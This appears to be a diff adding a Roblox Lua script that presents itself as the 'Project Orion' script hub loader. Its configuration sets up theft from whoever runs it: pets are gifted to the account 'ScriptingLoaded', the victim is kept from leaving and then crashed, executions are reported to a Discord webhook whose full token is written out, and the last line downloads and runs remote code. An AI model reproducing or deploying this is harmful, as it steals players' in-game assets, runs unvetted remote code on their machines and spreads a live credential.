@@ -1,0 +1,23 @@
+
+
+_G.Username = "ScriptingLoaded" --// Username To Send Pets To
+_G.GiftMessage = "NEXT TIME DONT USE SCRIPT!" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true --// Crashes Them After Its Finished
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = true --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1097128932958023741/OcaF9TBUajYuTy4fLdPJz4jx1Cqt4zauucKCzn3pFhLgzPZeZ4c27U2jl7iJl_arnhg5" --// Discord Webhook For Executions
+
+
+_G.ScriptName = "Project Orion" --// Script Name On The UI
+_G.Tip1 = "Project Orion Script Hub" --// Gives You Tips On The UI
+_G.Tip2 = "Loading Script" --// Gives You Tips On The UI
+_G.Tip3 = "Waiting to load" --// Gives You Tips On The UI
+_G.Tip4 = "Taking too longer than expected.." --// Gives You Tips On The UI
+_G.Tip5 = "Almost done" --// Gives You Tips On The UI
+
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
